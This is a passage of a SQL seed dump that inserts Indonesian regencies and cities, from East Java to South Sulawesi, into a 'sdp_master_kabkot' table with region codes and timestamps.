INSERT INTO `sdp_master_kabkot` VALUES (300, '35', '23', 'KABUPATEN TUBAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:53:42', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (301, '35', '24', 'KABUPATEN LAMONGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:53:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (302, '35', '25', 'KABUPATEN GRESIK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:54:07', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (303, '35', '26', 'KABUPATEN BANGKALAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:54:23', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (304, '35', '27', 'KABUPATEN SAMPANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:54:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (305, '35', '28', 'KABUPATEN PAMEKASAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:54:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (306, '35', '29', 'KABUPATEN SUMENEP', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:55:04', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (307, '35', '71', 'KOTA KEDIRI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:55:28', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (308, '35', '72', 'KOTA BLITAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:55:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (309, '35', '73', 'KOTA MALANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:55:54', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (310, '35', '74', 'KOTA PROBOLINGGO', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 23:40:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (311, '35', '75', 'KOTA PASURUAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:56:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (312, '35', '76', 'KOTA MOJOKERTO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:56:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (313, '35', '77', 'KOTA MADIUN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:56:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (314, '35', '78', 'KOTA SURABAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-11-11 13:03:20', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (315, '35', '79', 'KOTA BATU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:57:20', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (316, '36', '01', 'KABUPATEN PANDEGLANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:15:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (317, '36', '02', 'KABUPATEN LEBAK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:15:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (318, '36', '03', 'KABUPATEN TANGERANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:16:54', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (319, '36', '04', 'KABUPATEN SERANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:17:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (320, '36', '71', 'KOTA TANGERANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:17:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (321, '36', '72', 'KOTA CILEGON', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:17:41', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (322, '36', '73', 'KOTA SERANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:17:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (323, '36', '74', 'KOTA TANGERANG SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:18:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (324, '51', '01', 'KABUPATEN JEMBRANA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:13:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (325, '51', '02', 'KABUPATEN TABANAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:13:46', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (326, '51', '03', 'KABUPATEN BADUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:14:03', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (327, '51', '04', 'KABUPATEN GIANYAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:14:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (328, '51', '05', 'KABUPATEN KLUNGKUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:14:42', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (329, '51', '06', 'KABUPATEN BANGLI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:15:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (330, '51', '07', 'KABUPATEN KARANG ASEM', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:16:34', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (331, '51', '08', 'KABUPATEN BULELENG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:16:53', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (332, '51', '71', 'KOTA DENPASAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 10:17:14', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (333, NULL, NULL, 'KABUPATEN LOMBOK BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (334, NULL, NULL, 'KABUPATEN LOMBOK TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (335, NULL, NULL, 'KABUPATEN LOMBOK TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (336, NULL, NULL, 'KABUPATEN SUMBAWA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (337, NULL, NULL, 'KABUPATEN DOMPU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (338, NULL, NULL, 'KABUPATEN BIMA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (339, NULL, NULL, 'KABUPATEN SUMBAWA BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (340, NULL, NULL, 'KABUPATEN LOMBOK UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (341, NULL, NULL, 'KOTA MATARAM', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (342, NULL, NULL, 'KOTA BIMA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (343, NULL, NULL, 'KABUPATEN SUMBA BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (344, NULL, NULL, 'KABUPATEN SUMBA TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (345, NULL, NULL, 'KABUPATEN KUPANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:55', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (346, NULL, NULL, 'KABUPATEN TIMOR TENGAH SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (347, NULL, NULL, 'KABUPATEN TIMOR TENGAH UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (348, NULL, NULL, 'KABUPATEN BELU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (349, NULL, NULL, 'KABUPATEN ALOR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (350, NULL, NULL, 'KABUPATEN LEMBATA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (351, NULL, NULL, 'KABUPATEN FLORES TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (352, NULL, NULL, 'KABUPATEN SIKKA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (353, NULL, NULL, 'KABUPATEN ENDE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (354, NULL, NULL, 'KABUPATEN NGADA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (355, NULL, NULL, 'KABUPATEN MANGGARAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (356, NULL, NULL, 'KABUPATEN ROTE NDAO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (357, NULL, NULL, 'KABUPATEN MANGGARAI BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (358, NULL, NULL, 'KABUPATEN SUMBA TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (359, NULL, NULL, 'KABUPATEN SUMBA BARAT DAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (360, NULL, NULL, 'KABUPATEN NAGEKEO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (361, NULL, NULL, 'KABUPATEN MANGGARAI TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (362, NULL, NULL, 'KABUPATEN SABU RAIJUA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (363, NULL, NULL, 'KABUPATEN MALAKA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (364, NULL, NULL, 'KOTA KUPANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:56', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (365, '61', '01', 'KABUPATEN SAMBAS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:58:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (366, '61', '07', 'KABUPATEN BENGKAYANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:59:46', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (367, '61', '08', 'KABUPATEN LANDAK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:00:13', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (368, '61', '02', 'KABUPATEN MEMPAWAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:58:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (369, '61', '03', 'KABUPATEN SANGGAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:58:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (370, '35', '04', 'KABUPATEN KETAPANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:59:04', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (371, '61', '05', 'KABUPATEN SINTANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:59:16', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (372, '61', '07', 'KABUPATEN KAPUAS HULU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:59:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (373, '61', '09', 'KABUPATEN SEKADAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:00:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (374, '61', '10', 'KABUPATEN MELAWI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:00:48', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (375, '61', '11', 'KABUPATEN KAYONG UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:01:06', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (376, '61', '12', 'KABUPATEN KUBU RAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:01:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (377, '61', '71', 'KOTA PONTIANAK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:01:46', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (378, '61', '72', 'KOTA SINGKAWANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:01:56', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (379, '62', '01', 'KABUPATEN KOTAWARINGIN BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:10:13', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (380, '62', '02', 'KABUPATEN KOTAWARINGIN TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:10:28', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (381, '62', '03', 'KABUPATEN KAPUAS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:10:53', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (382, '62', '04', 'KABUPATEN BARITO SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:11:05', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (383, '62', '05', 'KABUPATEN BARITO UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:11:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (384, '62', '08', 'KABUPATEN SUKAMARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:12:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (385, '62', '09', 'KABUPATEN LAMANDAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:12:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (386, '62', '07', 'KABUPATEN SERUYAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:11:47', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (387, '62', '06', 'KABUPATEN KATINGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:11:34', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (388, '62', '11', 'KABUPATEN PULANG PISAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:13:10', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (389, '62', '10', 'KABUPATEN GUNUNG MAS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:12:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (390, '62', '13', 'KABUPATEN BARITO TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:13:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (391, '62', '12', 'KABUPATEN MURUNG RAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:13:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (392, '62', '71', 'KOTA PALANGKA RAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:14:05', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (393, '63', '01', 'KABUPATEN TANAH LAUT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:03:34', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (394, '63', '02', 'KABUPATEN KOTA BARU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:03:53', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (395, '63', '03', 'KABUPATEN BANJAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:04:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (396, '63', '04', 'KABUPATEN BARITO KUALA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:05:11', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (397, '63', '05', 'KABUPATEN TAPIN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:05:44', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (398, '63', '06', 'KABUPATEN HULU SUNGAI SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:06:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (399, '63', '07', 'KABUPATEN HULU SUNGAI TENGAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:06:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (400, '63', '08', 'KABUPATEN HULU SUNGAI UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:07:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (401, '63', '09', 'KABUPATEN TABALONG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:07:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (402, '63', '10', 'KABUPATEN TANAH BUMBU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:08:11', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (403, '63', '11', 'KABUPATEN BALANGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:08:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (404, '63', '71', 'KOTA BANJARMASIN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:08:43', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (405, '63', '72', 'KOTA BANJAR BARU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:09:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (406, '64', '01', 'KABUPATEN PASER', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:21:11', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (407, '64', '07', 'KABUPATEN KUTAI BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:22:10', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (408, '64', '02', 'KABUPATEN KUTAI KARTANEGARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:21:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (409, '64', '08', 'KABUPATEN KUTAI TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:23:03', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (410, '64', '03', 'KABUPATEN BERAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:21:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (411, '64', '09', 'KABUPATEN PENAJAM PASER UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:23:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (412, '64', '11', 'KABUPATEN MAHAKAM HULU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:23:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (413, '64', '71', 'KOTA BALIKPAPAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:24:08', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (414, '64', '72', 'KOTA SAMARINDA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:24:47', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (415, '64', '74', 'KOTA BONTANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:25:00', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (416, '65', '02', 'KABUPATEN MALINAU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:25:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (417, '65', '01', 'KABUPATEN BULUNGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:25:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (418, '64', '04', 'KABUPATEN TANA TIDUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:26:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (419, '65', '03', 'KABUPATEN NUNUKAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:26:03', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (420, '65', '71', 'KOTA TARAKAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:26:51', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (421, NULL, NULL, 'KABUPATEN BOLAANG MONGONDOW', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (422, NULL, NULL, 'KABUPATEN MINAHASA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (423, NULL, NULL, 'KABUPATEN KEPULAUAN SANGIHE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (424, NULL, NULL, 'KABUPATEN KEPULAUAN TALAUD', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (425, NULL, NULL, 'KABUPATEN MINAHASA SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (426, NULL, NULL, 'KABUPATEN MINAHASA UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (427, NULL, NULL, 'KABUPATEN BOLAANG MONGONDOW UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (428, NULL, NULL, 'KABUPATEN SIAU TAGULANDANG BIARO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (429, NULL, NULL, 'KABUPATEN MINAHASA TENGGARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (430, NULL, NULL, 'KABUPATEN BOLAANG MONGONDOW SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (431, NULL, NULL, 'KABUPATEN BOLAANG MONGONDOW TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (432, NULL, NULL, 'KOTA MANADO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (433, NULL, NULL, 'KOTA BITUNG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (434, NULL, NULL, 'KOTA TOMOHON', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (435, NULL, NULL, 'KOTA KOTAMOBAGU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (436, NULL, NULL, 'KABUPATEN BANGGAI KEPULAUAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (437, NULL, NULL, 'KABUPATEN BANGGAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (438, NULL, NULL, 'KABUPATEN MOROWALI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (439, NULL, NULL, 'KABUPATEN POSO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (440, NULL, NULL, 'KABUPATEN DONGGALA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (441, NULL, NULL, 'KABUPATEN TOLI-TOLI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:58', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (442, NULL, NULL, 'KABUPATEN BUOL', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (443, NULL, NULL, 'KABUPATEN PARIGI MOUTONG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (444, NULL, NULL, 'KABUPATEN TOJO UNA-UNA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (445, NULL, NULL, 'KABUPATEN SIGI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (446, NULL, NULL, 'KABUPATEN BANGGAI LAUT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (447, NULL, NULL, 'KABUPATEN MOROWALI UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (448, NULL, NULL, 'KOTA PALU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (449, NULL, NULL, 'KABUPATEN KEPULAUAN SELAYAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (450, NULL, NULL, 'KABUPATEN BULUKUMBA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (451, NULL, NULL, 'KABUPATEN BANTAENG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (452, NULL, NULL, 'KABUPATEN JENEPONTO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (453, NULL, NULL, 'KABUPATEN TAKALAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (454, NULL, NULL, 'KABUPATEN GOWA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (455, NULL, NULL, 'KABUPATEN SINJAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (456, NULL, NULL, 'KABUPATEN MAROS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (457, NULL, NULL, 'KABUPATEN PANGKAJENE DAN KEPULAUAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (458, NULL, NULL, 'KABUPATEN BARRU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (459, NULL, NULL, 'KABUPATEN BONE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (460, NULL, NULL, 'KABUPATEN SOPPENG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (461, NULL, NULL, 'KABUPATEN WAJO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (462, NULL, NULL, 'KABUPATEN SIDENRENG RAPPANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
